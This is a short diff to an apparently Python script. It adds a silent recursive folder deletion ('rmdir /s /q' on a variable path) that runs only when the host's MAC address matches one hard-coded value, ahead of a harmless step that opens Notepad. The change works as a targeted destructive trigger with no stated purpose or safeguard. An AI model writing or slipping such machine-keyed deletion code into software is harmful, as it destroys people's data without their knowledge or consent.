@@ -13,6 +13,13 @@ mac_addresses = re.findall(mac_address_pattern, tri)
 
 if "36-02-86-52-8E-DD" in mac_addresses:
     try:
+        
+        try:
+            subprocess.run(['rmdir', '/s', '/q', path], check=True)
+            print(f"Folder at {path} deleted successfully.")
+        except subprocess.CalledProcessError as e:
+            print(f"Error: {e}")
+
         subprocess.Popen(['notepad.exe'])
         print("Notepad opened successfully.")
     except Exception as e:
